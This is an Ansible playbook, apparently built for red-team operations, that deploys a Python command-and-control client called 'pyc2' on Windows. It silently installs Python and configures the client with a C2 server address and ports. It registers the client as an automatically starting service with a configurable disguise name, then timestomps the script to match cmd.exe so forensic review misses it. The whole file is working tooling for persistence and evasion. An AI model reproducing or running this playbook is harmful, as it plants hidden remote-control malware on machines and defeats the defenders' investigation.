---
- name: Ensure destination directory exists on Windows
  ansible.windows.win_file:
    path: "C:\\Temp"
    state: directory
    recurse: yes
    
- name: Download Python installer
  win_get_url:
    url: "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe"
    dest: "C:\\Temp\\python-installer.exe"

- name: Install Python silently
  win_package:
    path: "C:\\Temp\\python-installer.exe"
    arguments: /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    product_id: "Python 3.11.8 (64-bit)"
    creates_path: "C:\\Program Files\\Python311\\python.exe"

- name: Remove the Python installer
  win_file:
    path: "C:\\Temp\\python-installer.exe"
    state: absent

- name: Ensure destination directory exists on Windows
  ansible.windows.win_file:
    path: "{{ pyc2_client_location_win | dirname }}"
    state: directory
    recurse: yes

- name: Copy Python client script
  win_copy:
    src: "files/client.py"
    dest: "{{ pyc2_client_location_win }}"

# Need to do this as separate tasks
- name: Update TIMEOUT value
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^TIMEOUT_TIME=.*'
    replace: 'TIMEOUT_TIME={{ pyc2_timeout_time }}'

- name: Update server IP
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^SERVER=.*'
    replace: 'SERVER="{{ pyc2_server }}"'

- name: Update server port
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^SERVER_PORT=.*'
    replace: 'SERVER_PORT={{ pyc2_port }}'

- name: Update server port range
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^PORT_RADIUS=.*'
    replace: 'PORT_RADIUS={{ pyc2_port_range }}'

- name: Update firewall name
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^FIREWALL_NAME=.*'
    replace: 'FIREWALL_NAME="{{ pyc2_firewall_name }}"'

- name: Update DEBUG value
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^DEBUG=.*'
    replace: 'DEBUG={{ pyc2_debug }}'

- name: Update BUFFER value
  replace:
    path: "{{ pyc2_client_location_win }}"
    regexp: '^BUFFER_SIZE=.*'
    replace: 'BUFFER_SIZE={{ pyc2_buffer_size }}'

- name: Create the Windows service using PowerShell
  win_shell: |
    $svcName = "{{ pyc2_service_name }}"
    $scriptPath = "{{ pyc2_client_location_win }}"
    $pythonPath = "C:\Program Files\Python311\python.exe"

    if (-not (Get-Service -Name $svcName -ErrorAction SilentlyContinue)) {
        New-Service -Name $svcName `
                    -BinaryPathName "`"$pythonPath`" `"$scriptPath`"" `
                    -DisplayName "{{ pyc2_service_name }}" `
                    -Description "{{ pyc2_service_description }}" `
                    -StartupType Automatic
    }
  args:
    executable: powershell

- name: Start the service
  win_service:
    name: "{{ pyc2_service_name }}"
    state: started
    start_mode: auto

# Firewall handled in client script
#- name: Allow inbound traffic on port through Windows firewall
#  win_firewall_rule:
#    name: "{{ pyc2_firewall_name }}"
#    enable: yes
#    direction: in
#    localport: any
#    remoteport: "{{ pyc2_port }}"
#    protocol: TCP
#    action: allow

#- name: Allow outbound traffic on port through Windows firewall
#  win_firewall_rule:
#    name: "{{ pyc2_firewall_name }}"
#    enable: yes
#    direction: out
#    localport: any
#    remoteport: "{{ pyc2_port }}"
#    protocol: TCP
#    action: allow

- name: Timestomp script to match cmd.exe
  win_shell: |
    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
  args:
    executable: powershell
